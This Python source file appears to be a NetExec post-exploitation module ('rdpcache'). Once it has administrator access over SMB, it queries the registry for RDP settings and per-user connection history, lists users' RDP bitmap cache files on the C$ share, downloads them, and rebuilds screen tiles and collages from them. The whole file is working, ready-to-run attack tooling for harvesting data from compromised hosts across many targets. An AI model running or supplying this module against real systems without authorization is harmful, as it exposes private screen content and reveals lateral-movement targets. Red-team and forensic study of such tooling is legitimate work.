import os
import re
import struct
from io import BytesIO
from pathlib import Path

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

MASK_BIT = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80]
BIN_CHUNK_SIZE = 256
BIN_TILE_HEADER_SIZE = 12
BMC_TILE_HEADER_SIZE = 0x14
MAX_TILE_DIMENSION = 256
DEFAULT_COLLAGE_WIDTH = 24


def _parse_rle_command(cmd, data, offset):
    if cmd >= 0xF0:
        if cmd in [0xF5, 0xFB, 0xFC, 0xFF]:
            return (-1, 0, 0)
        elif cmd in [0xFD, 0xFE]:
            return (cmd, 1, 0)
        elif cmd in [0xF9, 0xFA]:
            return (cmd, 8, 0)
        else:
            if offset + 2 <= len(data):
                count = struct.unpack_from("<H", data, offset)[0]
                return (cmd, count, 2)
            return (-1, 0, 0)

    if cmd < 0x40:
        cmd_type = cmd & 0xE0
        count = cmd & 0x1F
        if count == 0 and offset < len(data):
            count = data[offset] + 1
            return (cmd_type, count, 1)
        return (cmd_type, count, 0)
    elif cmd < 0x80:
        cmd_type = cmd & 0xE0
        count = cmd & 0x1F
        if count == 0 and offset < len(data):
            count = data[offset] + 1
            return (cmd_type, count, 1)
        return (cmd_type, count, 0)
    else:
        cmd_type = cmd & 0xF0
        count = cmd & 0x0F
        if count == 0 and offset < len(data):
            count = data[offset] + 1
            return (cmd_type, count, 1)
        return (cmd_type, count, 0)


def decompress_rle(data, width, height):
    output_size = width * height * 3
    output = bytearray(output_size)
    row_size = width * 3
    src_offset = 0
    dst_offset = 0
    fg_color = bytearray([0xff, 0xff, 0xff])

    try:
        while src_offset < len(data) and dst_offset < output_size:
            cmd = data[src_offset]
            src_offset += 1
            cmd_type, count, extra_bytes = _parse_rle_command(cmd, data, src_offset)
            src_offset += extra_bytes

            if cmd_type == -1:
                continue

            if cmd == 0xFE:
                if dst_offset + 3 <= output_size:
                    output[dst_offset:dst_offset + 3] = b'\x00\x00\x00'
                    dst_offset += 3

            elif cmd == 0xFD:
                if dst_offset + 3 <= output_size:
                    output[dst_offset:dst_offset + 3] = b'\xff\xff\xff'
                    dst_offset += 3

            elif cmd_type == 0x00 or cmd == 0xF0:
                for _ in range(count):
                    if dst_offset + 3 <= output_size:
                        if dst_offset >= row_size:
                            prev = dst_offset - row_size
                            output[dst_offset] = output[prev]
                            output[dst_offset + 1] = output[prev + 1]
                            output[dst_offset + 2] = output[prev + 2]
                        else:
                            output[dst_offset:dst_offset + 3] = b'\x00\x00\x00'
                        dst_offset += 3

            elif cmd_type == 0x20 or cmd == 0xF1:
                for _ in range(count):
                    if dst_offset + 3 <= output_size:
                        if dst_offset >= row_size:
                            prev = dst_offset - row_size
                            output[dst_offset] = output[prev] ^ fg_color[0]
                            output[dst_offset + 1] = output[prev + 1] ^ fg_color[1]
                            output[dst_offset + 2] = output[prev + 2] ^ fg_color[2]
                        else:
                            output[dst_offset:dst_offset + 3] = fg_color
                        dst_offset += 3

            elif cmd_type == 0xC0 or cmd == 0xF6:
                if src_offset + 3 <= len(data):
                    fg_color = bytearray(data[src_offset:src_offset + 3])
                    src_offset += 3
                for _ in range(count):
                    if dst_offset + 3 <= output_size:
                        if dst_offset >= row_size:
                            prev = dst_offset - row_size
                            output[dst_offset] = output[prev] ^ fg_color[0]
                            output[dst_offset + 1] = output[prev + 1] ^ fg_color[1]
                            output[dst_offset + 2] = output[prev + 2] ^ fg_color[2]
                        else:
                            output[dst_offset:dst_offset + 3] = fg_color
                        dst_offset += 3

            elif cmd_type == 0x40 or cmd == 0xF2:
                mask_bytes = (count + 7) // 8
                if src_offset + mask_bytes <= len(data):
                    mask_data = data[src_offset:src_offset + mask_bytes]
                    src_offset += mask_bytes
                    for i in range(count):
                        if dst_offset + 3 <= output_size:
                            byte_idx = i // 8
                            bit_idx = i % 8
                            use_fg = (mask_data[byte_idx] & MASK_BIT[bit_idx]) != 0
                            if dst_offset >= row_size:
                                prev = dst_offset - row_size
                                if use_fg:
                                    output[dst_offset] = output[prev] ^ fg_color[0]
                                    output[dst_offset + 1] = output[prev + 1] ^ fg_color[1]
                                    output[dst_offset + 2] = output[prev + 2] ^ fg_color[2]
                                else:
                                    output[dst_offset] = output[prev]
                                    output[dst_offset + 1] = output[prev + 1]
                                    output[dst_offset + 2] = output[prev + 2]
                            else:
                                if use_fg:
                                    output[dst_offset:dst_offset + 3] = fg_color
                                else:
                                    output[dst_offset:dst_offset + 3] = b'\x00\x00\x00'
                            dst_offset += 3

            elif cmd_type == 0xD0 or cmd == 0xF7:
                if src_offset + 3 <= len(data):
                    fg_color = bytearray(data[src_offset:src_offset + 3])
                    src_offset += 3
                mask_bytes = (count + 7) // 8
                if src_offset + mask_bytes <= len(data):
                    mask_data = data[src_offset:src_offset + mask_bytes]
                    src_offset += mask_bytes
                    for i in range(count):
                        if dst_offset + 3 <= output_size:
                            byte_idx = i // 8
                            bit_idx = i % 8
                            use_fg = (mask_data[byte_idx] & MASK_BIT[bit_idx]) != 0
                            if dst_offset >= row_size:
                                prev = dst_offset - row_size
                                if use_fg:
                                    output[dst_offset] = output[prev] ^ fg_color[0]
                                    output[dst_offset + 1] = output[prev + 1] ^ fg_color[1]
                                    output[dst_offset + 2] = output[prev + 2] ^ fg_color[2]
                                else:
                                    output[dst_offset] = output[prev]
                                    output[dst_offset + 1] = output[prev + 1]
                                    output[dst_offset + 2] = output[prev + 2]
                            else:
                                if use_fg:
                                    output[dst_offset:dst_offset + 3] = fg_color
                                else:
                                    output[dst_offset:dst_offset + 3] = b'\x00\x00\x00'
                            dst_offset += 3

            elif cmd_type == 0x60 or cmd == 0xF3:
                if src_offset + 3 <= len(data):
                    color = data[src_offset:src_offset + 3]
                    src_offset += 3
                    for _ in range(count):
                        if dst_offset + 3 <= output_size:
                            output[dst_offset:dst_offset + 3] = color
                            dst_offset += 3

            elif cmd_type == 0x80 or cmd == 0xF4:
                for _ in range(count):
                    if src_offset + 3 <= len(data) and dst_offset + 3 <= output_size:
                        output[dst_offset:dst_offset + 3] = data[src_offset:src_offset + 3]
                        src_offset += 3
                        dst_offset += 3

            elif cmd_type == 0xE0 or cmd == 0xF8:
                if src_offset + 6 <= len(data):
                    color1 = data[src_offset:src_offset + 3]
                    color2 = data[src_offset + 3:src_offset + 6]
                    src_offset += 6
                    for i in range(count):
                        if dst_offset + 3 <= output_size:
                            if i % 2 == 0:
                                output[dst_offset:dst_offset + 3] = color1
                            else:
                                output[dst_offset:dst_offset + 3] = color2
                            dst_offset += 3

            elif cmd == 0xF9:
                mask = 0x03
                for i in range(8):
                    if dst_offset + 3 <= output_size:
                        use_fg = (mask & MASK_BIT[i]) != 0
                        if dst_offset >= row_size:
                            prev = dst_offset - row_size
                            if use_fg:
                                output[dst_offset] = output[prev] ^ fg_color[0]
                                output[dst_offset + 1] = output[prev + 1] ^ fg_color[1]
                                output[dst_offset + 2] = output[prev + 2] ^ fg_color[2]
                            else:
                                output[dst_offset] = output[prev]
                                output[dst_offset + 1] = output[prev + 1]
                                output[dst_offset + 2] = output[prev + 2]
                        else:
                            if use_fg:
                                output[dst_offset:dst_offset + 3] = fg_color
                            else:
                                output[dst_offset:dst_offset + 3] = b'\x00\x00\x00'
                        dst_offset += 3

            elif cmd == 0xFA:
                mask = 0x05
                for i in range(8):
                    if dst_offset + 3 <= output_size:
                        use_fg = (mask & MASK_BIT[i]) != 0
                        if dst_offset >= row_size:
                            prev = dst_offset - row_size
                            if use_fg:
                                output[dst_offset] = output[prev] ^ fg_color[0]
                                output[dst_offset + 1] = output[prev + 1] ^ fg_color[1]
                                output[dst_offset + 2] = output[prev + 2] ^ fg_color[2]
                            else:
                                output[dst_offset] = output[prev]
                                output[dst_offset + 1] = output[prev + 1]
                                output[dst_offset + 2] = output[prev + 2]
                        else:
                            if use_fg:
                                output[dst_offset:dst_offset + 3] = fg_color
                            else:
                                output[dst_offset:dst_offset + 3] = b'\x00\x00\x00'
                        dst_offset += 3

    except Exception:
        pass

    rgba_output = bytearray(width * height * 4)
    for i in range(width * height):
        src_idx = i * 3
        dst_idx = i * 4
        if src_idx + 2 < len(output):
            rgba_output[dst_idx] = output[src_idx]
            rgba_output[dst_idx + 1] = output[src_idx + 1]
            rgba_output[dst_idx + 2] = output[src_idx + 2]
            rgba_output[dst_idx + 3] = 0xff

    return bytes(rgba_output)


class NXCModule:
    name = "rdpcache"
    description = "Extract RDP Bitmap Cache from remote machines"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = "enum"
        self.output_dir = None
        self.target_users = "all"
        self.create_collage = True
        self.collage_width = DEFAULT_COLLAGE_WIDTH
        self.smart_collage = False

    def options(self, context, module_options):
        self.action = module_options.get("ACTION", "enum").lower()
        self.output_dir = module_options.get("OUTPUT", "./rdpcache_output")
        self.target_users = module_options.get("USERS", "all")
        self.create_collage = module_options.get("COLLAGE", "True").lower() in ("true", "1", "yes")
        self.collage_width = int(module_options.get("COLLAGE_WIDTH", str(DEFAULT_COLLAGE_WIDTH)))
        self.smart_collage = module_options.get("SMART", "").lower() in ("true", "1", "yes")

    def on_admin_login(self, context, connection):
        host = connection.host
        hostname = connection.hostname if hasattr(connection, 'hostname') else host

        if self.action == "enum":
            self._action_enum(context, connection, hostname)
        elif self.action == "dump":
            self._action_dump(context, connection, hostname, host)
        else:
            context.log.fail(f"Unknown action: {self.action}. Use 'enum' or 'dump'")

    def _action_enum(self, context, connection, hostname):
        context.log.display("[RDP Cache Enumeration]")

        rdp_settings = self._get_rdp_settings(context, connection)
        if rdp_settings:
            context.log.display("")
            context.log.display("RDP Client Settings:")
            context.log.display("-" * 50)
            for key, value in rdp_settings.items():
                if value is not None:
                    context.log.display(f"  {key}: {value}")

        ts_settings = self._get_terminal_server_settings(context, connection)
        if ts_settings:
            context.log.display("")
            context.log.display("RDP Server Settings:")
            context.log.display("-" * 50)
            for key, value in ts_settings.items():
                if value is not None:
                    context.log.display(f"  {key}: {value}")

        rdp_history = self._get_rdp_history(context, connection)
        if rdp_history:
            context.log.display("")
            context.log.display("RDP Connection History (MRU):")
            context.log.display("-" * 50)
            for username, servers in rdp_history.items():
                context.log.highlight(f"  [{username}]")
                for idx, server in enumerate(servers[:10], 1):
                    context.log.display(f"    {idx}. {server}")
                if len(servers) > 10:
                    context.log.display(f"    ... and {len(servers) - 10} more")

        users_with_cache = self._enumerate_users_with_cache(context, connection)
        context.log.display("")
        context.log.display("Users with RDP Bitmap Cache:")
        context.log.display("-" * 50)

        if users_with_cache:
            for username, cache_files in users_with_cache.items():
                total_size = 0
                for cf in cache_files:
                    size = self._get_file_size(connection, cf)
                    if size:
                        total_size += size
                size_str = self._format_size(total_size)
                context.log.success(f"  {username}: {len(cache_files)} file(s), {size_str}")
                for cf in cache_files:
                    fname = Path(cf).name
                    fsize = self._get_file_size(connection, cf)
                    fsize_str = self._format_size(fsize) if fsize else "?"
                    context.log.display(f"    - {fname} ({fsize_str})")
        else:
            context.log.display("  No users with RDP cache found")

        context.log.display("")
        context.log.highlight("To extract cache, run with: -o ACTION=dump")

    def _action_dump(self, context, connection, hostname, host):
        if not HAS_PIL:
            context.log.fail("Pillow library required. Run: pip install Pillow")
            return

        context.log.info(f"Starting RDP cache extraction from {hostname}")

        host_output_dir = Path(self.output_dir) / f"{hostname}_{host}"
        host_output_dir.mkdir(parents=True, exist_ok=True)

        users_with_cache = self._enumerate_users_with_cache(context, connection)
        if not users_with_cache:
            context.log.fail("No RDP cache files found on target")
            return

        context.log.success(f"Found {len(users_with_cache)} user(s) with RDP cache")
        total_tiles = 0

        for username, cache_files in users_with_cache.items():
            context.log.info(f"Processing user: {username} ({len(cache_files)} cache files)")

            user_output_dir = host_output_dir / username
            user_output_dir.mkdir(parents=True, exist_ok=True)
            all_tiles = []

            for cache_file in cache_files:
                try:
                    cache_filename = Path(cache_file).name
                    context.log.info(f"  Downloading {cache_filename}...")

                    cache_data = self._download_file(context, connection, cache_file)
                    if not cache_data:
                        continue

                    context.log.info(f"  Downloaded {len(cache_data)} bytes")

                    raw_path = user_output_dir / "raw" / cache_filename
                    raw_path.parent.mkdir(parents=True, exist_ok=True)
                    raw_path.write_bytes(cache_data)

                    tiles = self._parse_rdp_cache(cache_data, cache_filename)
                    if tiles:
                        context.log.success(f"  Extracted {len(tiles)} tiles from {cache_filename}")
                        all_tiles.extend(tiles)

                        tiles_dir = user_output_dir / "tiles"
                        tiles_dir.mkdir(parents=True, exist_ok=True)
                        for idx, tile in enumerate(tiles):
                            tile_path = tiles_dir / f"{cache_filename}_{idx:05d}.bmp"
                            tile.save(str(tile_path), "BMP")
                    else:
                        context.log.fail(f"  No tiles extracted from {cache_filename}")

                except Exception as e:
                    context.log.fail(f"  Error processing {cache_file}: {str(e)}")

            if self.create_collage and all_tiles:
                collage_path = user_output_dir / f"collage_{username}.png"
                self._create_collage(all_tiles, str(collage_path), self.smart_collage)
                context.log.success(f"  Created collage: {collage_path}")

            total_tiles += len(all_tiles)

        context.log.success(f"Extraction complete. Total tiles: {total_tiles}")
        context.log.info(f"Output saved to: {host_output_dir}")

    def _get_rdp_settings(self, context, connection):
        settings = {}
        reg_keys = [
            (r"HKCU\Software\Microsoft\Terminal Server Client", [
                ("BitmapCacheSize", "Bitmap Cache Size (KB)"),
                ("BitmapPersistCacheSize", "Persistent Cache Size (KB)"),
            ]),
            (r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", [
                ("PortNumber", "RDP Port"),
                ("SecurityLayer", "Security Layer"),
                ("UserAuthentication", "NLA Required"),
            ]),
            (r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server", [
                ("fDenyTSConnections", "RDP Disabled"),
            ]),
        ]

        for reg_path, values in reg_keys:
            try:
                output = self._exec_command(connection, f'reg query "{reg_path}" 2>nul')
                if output:
                    for value_name, display_name in values:
                        match = re.search(rf'{value_name}\s+REG_(?:DWORD|SZ|EXPAND_SZ)\s+(.+)', output, re.IGNORECASE)
                        if match:
                            val = match.group(1).strip()
                            if val.startswith("0x"):
                                val = int(val, 16)
                            settings[display_name] = val
            except Exception:
                pass

        return settings

    def _get_terminal_server_settings(self, context, connection):
        settings = {}

        try:
            output = self._exec_command(connection, r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections 2>nul')
            if output:
                match = re.search(r'fDenyTSConnections\s+REG_DWORD\s+(0x[0-9a-fA-F]+|\d+)', output)
                if match:
                    val = match.group(1)
                    val = int(val, 16) if val.startswith("0x") else int(val)
                    settings["RDP Enabled"] = "No" if val == 1 else "Yes"

            output = self._exec_command(connection, r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber 2>nul')
            if output:
                match = re.search(r'PortNumber\s+REG_DWORD\s+(0x[0-9a-fA-F]+|\d+)', output)
                if match:
                    val = match.group(1)
                    val = int(val, 16) if val.startswith("0x") else int(val)
                    settings["RDP Port"] = val

            output = self._exec_command(connection, r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication 2>nul')
            if output:
                match = re.search(r'UserAuthentication\s+REG_DWORD\s+(0x[0-9a-fA-F]+|\d+)', output)
                if match:
                    val = match.group(1)
                    val = int(val, 16) if val.startswith("0x") else int(val)
                    settings["NLA Required"] = "Yes" if val == 1 else "No"

            output = self._exec_command(connection, r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer 2>nul')
            if output:
                match = re.search(r'SecurityLayer\s+REG_DWORD\s+(0x[0-9a-fA-F]+|\d+)', output)
                if match:
                    val = match.group(1)
                    val = int(val, 16) if val.startswith("0x") else int(val)
                    security_layers = {0: "RDP Security", 1: "Negotiate", 2: "TLS"}
                    settings["Security Layer"] = security_layers.get(val, f"Unknown ({val})")
        except Exception:
            pass

        return settings

    def _get_rdp_history(self, context, connection):
        history = {}

        try:
            output = self._exec_command(connection, r'reg query "HKU" 2>nul')
            if not output:
                return history

            sids = re.findall(r'(S-1-5-21-[\d-]+)(?!_Classes)', output)

            for sid in sids:
                user_history = []

                output = self._exec_command(connection, f'reg query "HKU\\{sid}\\Software\\Microsoft\\Terminal Server Client\\Default" 2>nul')
                if output:
                    matches = re.findall(r'MRU\d+\s+REG_SZ\s+(.+)', output)
                    for match in matches:
                        server = match.strip()
                        if server and server not in user_history:
                            user_history.append(server)

                output = self._exec_command(connection, f'reg query "HKU\\{sid}\\Software\\Microsoft\\Terminal Server Client\\Servers" 2>nul')
                if output:
                    matches = re.findall(r'Servers\\([^\s\\]+)', output)
                    for match in matches:
                        server = match.strip()
                        if server and server not in user_history:
                            user_history.append(server)

                if user_history:
                    username = self._sid_to_username(connection, sid)
                    history[username or sid] = user_history
        except Exception:
            pass

        return history

    def _sid_to_username(self, connection, sid):
        try:
            output = self._exec_command(connection, f'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{sid}" /v ProfileImagePath 2>nul')
            if output:
                match = re.search(r'ProfileImagePath\s+REG_EXPAND_SZ\s+(.+)', output)
                if match:
                    path = match.group(1).strip()
                    if '\\' in path:
                        return path.split('\\')[-1]
        except Exception:
            pass
        return None

    def _exec_command(self, connection, command):
        try:
            if hasattr(connection, 'execute'):
                return connection.execute(command, True)
            if hasattr(connection, 'wmi'):
                return connection.wmi(command)
            if hasattr(connection, 'exec_method'):
                return connection.exec_method(command)
            return None
        except Exception:
            return None

    def _get_file_size(self, connection, remote_path):
        share = "C$"
        try:
            parent_path = str(Path(remote_path).parent)
            filename = Path(remote_path).name
            files = connection.conn.listPath(share, parent_path + "\\*")
            for f in files:
                if f.get_longname().lower() == filename.lower():
                    return f.get_filesize()
        except Exception:
            pass
        return None

    def _format_size(self, size):
        if size is None:
            return "?"
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size / 1024:.1f} KB"
        else:
            return f"{size / (1024 * 1024):.1f} MB"

    def _enumerate_users_with_cache(self, context, connection):
        users_with_cache = {}
        share = "C$"

        try:
            users_path = "Users"
            try:
                user_dirs = connection.conn.listPath(share, users_path + "\\*")
            except Exception:
                return users_with_cache

            for entry in user_dirs:
                username = entry.get_longname()
                if username in (".", "..", "All Users", "Default", "Default User", "Public", "desktop.ini"):
                    continue
                if not entry.is_directory():
                    continue
                if self.target_users != "all":
                    target_list = [u.strip().lower() for u in self.target_users.split(",")]
                    if username.lower() not in target_list:
                        continue

                cache_path = f"Users\\{username}\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache"

                try:
                    cache_files = connection.conn.listPath(share, cache_path + "\\*")
                    cache_file_paths = []
                    for cache_entry in cache_files:
                        filename = cache_entry.get_longname()
                        if filename.startswith("Cache") and filename.endswith(".bin"):
                            cache_file_paths.append(f"{cache_path}\\{filename}")
                        elif filename.startswith("bcache") and filename.endswith(".bmc"):
                            cache_file_paths.append(f"{cache_path}\\{filename}")
                    if cache_file_paths:
                        users_with_cache[username] = cache_file_paths
                except Exception:
                    pass
        except Exception:
            pass

        return users_with_cache

    def _download_file(self, context, connection, remote_path):
        share = "C$"
        try:
            file_data = BytesIO()
            smb_path = remote_path.replace("/", "\\").lstrip("\\")
            connection.conn.getFile(share, smb_path, file_data.write)
            return file_data.getvalue()
        except Exception:
            return None

    def _parse_rdp_cache(self, data, filename=""):
        tiles = []
        if len(data) < 12:
            return tiles
        if data[:8] == b"RDP8bmp\x00":
            tiles = self._parse_bin_format(data)
        else:
            tiles = self._parse_bmc_format(data)
        return tiles

    def _parse_bin_format(self, data):
        tiles = []
        if len(data) < BIN_TILE_HEADER_SIZE:
            return tiles
        if data[:8] != b"RDP8bmp\x00":
            return tiles

        offset = 12

        while offset + BIN_TILE_HEADER_SIZE <= len(data):
            key1, key2, t_width, t_height = struct.unpack_from("<LLHH", data, offset)
            offset += BIN_TILE_HEADER_SIZE

            if key1 == 0 and key2 == 0:
                continue
            if t_width == 0 or t_height == 0 or t_width > MAX_TILE_DIMENSION or t_height > MAX_TILE_DIMENSION:
                break

            byte_len = 4 * t_width * t_height
            if offset + byte_len > len(data):
                break

            raw_data = data[offset:offset + byte_len]
            offset += byte_len

            try:
                img = self._parse_bin_rgb32(raw_data, t_width, t_height)
                if img:
                    tiles.append(img)
            except Exception:
                pass

        return tiles

    def _parse_bin_rgb32(self, raw_data, width, height):
        d_out = bytearray()
        d_buf = bytearray()

        i = 0
        while i < len(raw_data):
            b = raw_data[i]
            g = raw_data[i + 1]
            r = raw_data[i + 2]
            d_buf.extend([r, g, b, 0xFF])

            if len(d_buf) == BIN_CHUNK_SIZE:
                d_out = d_buf + d_out
                d_buf = bytearray()
            i += 4

        if d_buf:
            d_out = d_buf + d_out

        img = Image.frombytes("RGBA", (width, height), bytes(d_out))
        return img.transpose(Image.FLIP_TOP_BOTTOM)

    def _parse_bmc_format(self, data):
        tiles = []
        offset = 0

        while offset + BMC_TILE_HEADER_SIZE <= len(data):
            key1, key2, t_width, t_height = struct.unpack_from("<LLHH", data, offset)
            data_size, _ = struct.unpack_from("<LL", data, offset + 12)
            offset += BMC_TILE_HEADER_SIZE

            if key1 == 0 and key2 == 0:
                continue
            if t_width == 0 or t_height == 0 or t_width > MAX_TILE_DIMENSION or t_height > MAX_TILE_DIMENSION:
                continue
            if data_size == 0 or data_size > 10 * 1024 * 1024:
                continue
            if offset + data_size > len(data):
                break

            raw_data = data[offset:offset + data_size]
            offset += data_size

            if raw_data[:16] == b'\x00' * 16:
                continue

            try:
                img = self._parse_bmc_tile(raw_data, t_width, t_height, data_size)
                if img:
                    tiles.append(img)
            except Exception:
                pass

        return tiles

    def _parse_bmc_tile(self, raw_data, width, height, data_size):
        expected_rgb32 = width * height * 4
        expected_rgb24 = width * height * 3
        expected_rgb16 = width * height * 2

        if data_size == expected_rgb32:
            d_buf = self._convert_bgr32_to_rgba(raw_data)
            return Image.frombytes("RGBA", (width, height), d_buf)
        elif data_size == expected_rgb24:
            d_buf = self._convert_bgr24_to_rgba(raw_data)
            return Image.frombytes("RGBA", (width, height), d_buf)
        elif data_size == expected_rgb16:
            d_buf = self._parse_rgb565(raw_data, width, height)
            return Image.frombytes("RGBA", (width, height), d_buf)
        elif data_size < expected_rgb16:
            d_buf = decompress_rle(raw_data, width, height)
            return Image.frombytes("RGBA", (width, height), d_buf)
        else:
            d_buf = self._convert_bgr32_to_rgba(raw_data[:expected_rgb32])
            while len(d_buf) < width * height * 4:
                d_buf += b"\x00\x00\x00\xFF"
            return Image.frombytes("RGBA", (width, height), d_buf)

    def _convert_bgr32_to_rgba(self, data):
        d_buf = bytearray()
        for i in range(0, len(data), 4):
            d_buf.extend([data[i + 2], data[i + 1], data[i], 0xFF])
        return bytes(d_buf)

    def _convert_bgr24_to_rgba(self, data):
        d_buf = bytearray()
        for i in range(0, len(data), 3):
            d_buf.extend([data[i + 2], data[i + 1], data[i], 0xFF])
        return bytes(d_buf)

    def _parse_rgb565(self, data, width, height):
        d_buf = bytearray()
        for i in range(0, len(data) - 1, 2):
            pxl = struct.unpack_from("<H", data, i)[0]
            bl = ((pxl >> 8) & 0xF8) | ((pxl >> 13) & 0x07)
            gr = ((pxl >> 3) & 0xFC) | ((pxl >> 9) & 0x03)
            re = ((pxl << 3) & 0xF8) | ((pxl >> 2) & 0x07)
            d_buf.extend([re, gr, bl, 0xFF])
        return bytes(d_buf)

    def _get_tile_brightness(self, img):
        if img.mode != "RGB":
            img = img.convert("RGB")
        pixels = list(img.getdata())
        n = len(pixels)
        avg_r = sum(p[0] for p in pixels) // n
        avg_g = sum(p[1] for p in pixels) // n
        avg_b = sum(p[2] for p in pixels) // n
        return (avg_r * 299 + avg_g * 587 + avg_b * 114) // 1000

    def _sort_tiles_by_brightness(self, tiles):
        if len(tiles) <= 1:
            return tiles
        return sorted(tiles, key=self._get_tile_brightness)

    def _create_collage(self, tiles, output_path, smart=False):
        if not tiles:
            return

        if smart:
            tiles = self._sort_tiles_by_brightness(tiles)

        tile_size = 64
        cols = self.collage_width

        remainder = len(tiles) % cols
        if remainder != 0:
            padding_needed = cols - remainder
            for _ in range(padding_needed):
                tiles.append(Image.new("RGB", (tile_size, tile_size), (255, 255, 255)))

        rows = len(tiles) // cols
        collage_width = cols * tile_size
        collage_height = rows * tile_size
        collage = Image.new("RGB", (collage_width, collage_height), (255, 255, 255))

        for idx, tile in enumerate(tiles):
            row = idx // cols
            col = idx % cols
            x = col * tile_size
            y = row * tile_size

            if tile.mode == "RGBA":
                bg = Image.new("RGB", tile.size, (255, 255, 255))
                bg.paste(tile, mask=tile.split()[3] if len(tile.split()) == 4 else None)
                tile = bg
            elif tile.mode != "RGB":
                tile = tile.convert("RGB")

            if tile.size != (tile_size, tile_size):
                padded = Image.new("RGB", (tile_size, tile_size), (255, 255, 255))
                paste_x = (tile_size - tile.size[0]) // 2
                paste_y = (tile_size - tile.size[1]) // 2
                padded.paste(tile, (paste_x, paste_y))
                tile = padded

            collage.paste(tile, (x, y))

        if output_path.lower().endswith('.bmp'):
            collage.save(output_path, "BMP")
        else:
            collage.save(output_path, "PNG", compress_level=0)


if __name__ == "__main__":
    import sys
    import argparse

    parser = argparse.ArgumentParser(description="RDP Bitmap Cache Parser")
    parser.add_argument("cache_file", help="RDP cache file (Cache*.bin or bcache*.bmc)")
    parser.add_argument("-o", "--output", default="./rdpcache_extracted", help="Output directory")
    parser.add_argument("--smart", action="store_true", help="Sort tiles by brightness")
    parser.add_argument("--cols", type=int, default=DEFAULT_COLLAGE_WIDTH, help="Tiles per row")
    parser.add_argument("--no-collage", action="store_true", help="Don't create collage")
    args = parser.parse_args()

    if not HAS_PIL:
        print("Error: Pillow required. Install with: pip install Pillow")
        sys.exit(1)

    cache_file = args.cache_file
    output_dir = args.output
    cache_filename = os.path.basename(cache_file)

    with open(cache_file, "rb") as f:
        data = f.read()

    print(f"Parsing {cache_file} ({len(data)} bytes)...")

    module = NXCModule()
    module.collage_width = args.cols
    tiles = module._parse_rdp_cache(data, cache_filename)

    print(f"Extracted {len(tiles)} tiles")

    if tiles:
        os.makedirs(output_dir, exist_ok=True)
        tiles_dir = os.path.join(output_dir, "tiles")
        os.makedirs(tiles_dir, exist_ok=True)

        for idx, tile in enumerate(tiles):
            tile_path = os.path.join(tiles_dir, f"tile_{idx:05d}.bmp")
            tile.save(tile_path, "BMP")

        print(f"Saved tiles to {tiles_dir}")

        if not args.no_collage:
            collage_path = os.path.join(output_dir, "collage.bmp")
            module._create_collage(tiles, collage_path, args.smart)
            print(f"Created collage: {collage_path}")
